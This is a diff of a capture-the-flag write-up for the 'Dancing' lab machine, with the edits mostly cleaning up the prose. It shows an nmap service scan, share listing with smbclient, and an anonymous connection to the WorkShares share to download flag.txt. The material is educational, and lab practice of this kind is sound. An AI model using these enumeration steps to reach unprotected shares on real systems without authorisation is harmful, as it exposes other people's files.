@@ -1,6 +1,6 @@
 <span style="color:cyan">**Question 1**</span> : What does the 3-letter acronym SMB stand for?
 
-SMB stands for Server Message Block. It's a network communication protocol used for sharing resources between devices on a network in Windows
+SMB stands for Server Message Block. It's a network communication protocol used for sharing resources between devices on a Windows network.
 
     Server Message Block
 
@@ -12,8 +12,7 @@ SMB typically operates over port 445
 
 <span style="color:cyan">**Question 3**</span> : What is the service name for port 445 that came up in our Nmap scan?
 
-At this point I use `nMap` to see which ports are opens and which services are running
-
+At this point, I used nMap to identify open ports and services.
 ```
 cmd : nmap -sV 10.129.66.11
 
@@ -31,7 +30,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 16.58 seconds
 ```
 
-So i can see that the service name for port 445 is microsoft-ds
+From the scan, I can see that the service name for port 445 is microsoft-ds.
 
     microsoft-ds
 
@@ -43,7 +42,7 @@ To list the available shares on a server using the smbclient utility, we can use
 
 <span style="color:cyan">**Question 5**</span> : How many shares are there on Dancing?
 
-So i tried the following: 
+I executed the command smbclient -L 10.129.227.215 and observed four shares on Dancing.
 
 ```
 cmd : smbclient -L 10.129.227.215
@@ -55,8 +54,6 @@ cmd : smbclient -L 10.129.227.215
 	IPC$            IPC       Remote IPC
 	WorkShares      Disk 
 ```
-
-So i can see there are 4 shares on Dancing
 
     4
 
@@ -70,7 +67,7 @@ I first observe that the answer is in the following format:
 
 From the previous output, i can see that there is a singol share with an s at the end, taht is WorkShares
 
-At this point I try to connect to this share, and i can see that i can connect without any password
+At this point, I attempted to connect to the 'WorkShares' share and observed that access was granted without requiring a password.
 
 ```
 cmd : smbclient \\\\10.129.227.215\\WorkShares
@@ -82,13 +79,13 @@ smb: \> help
 
 <span style="color:cyan">**Question 7**</span> : What is the command we can use within the SMB shell to download the files we find?
 
-I can use the get command to download files.
+I can use the `get` command to download files.
 
     get
 
 <span style="color:cyan">**Question 8**</span> : Submit root flag
 
-Using `help` command, I can see that th ecommand `ls` is avaiable. So i start to navigate into the system, and i observe that there are two directiryes: 
+I checked out the available commands using 'help,' and saw that 'ls' was there. So, I started poking around the system and noticed two directories
 
 ```
 cmd: ls
@@ -101,7 +98,7 @@ James.P                             D        0  Thu Jun  3 10:38:03 2021
 	5114111 blocks of size 4096. 1747900 blocks available
 ```
 
-By entering on the second directory, i see there is the flag file: 
+When I went into the second directory, I spotted the flag file
 
 ```
 cmd : cd James.P
@@ -115,8 +112,7 @@ flag.txt                            A       32  Mon Mar 29 11:26:57 2021
 	5114111 blocks of size 4096. 1747877 blocks available
 ```
 
-Finally i can use the get command to download flag.txt and i have the flag
-
+Finally i can use the `get`` command to download flag.txt and obtain the flag
 ```
 cmd : get flag.txt
 
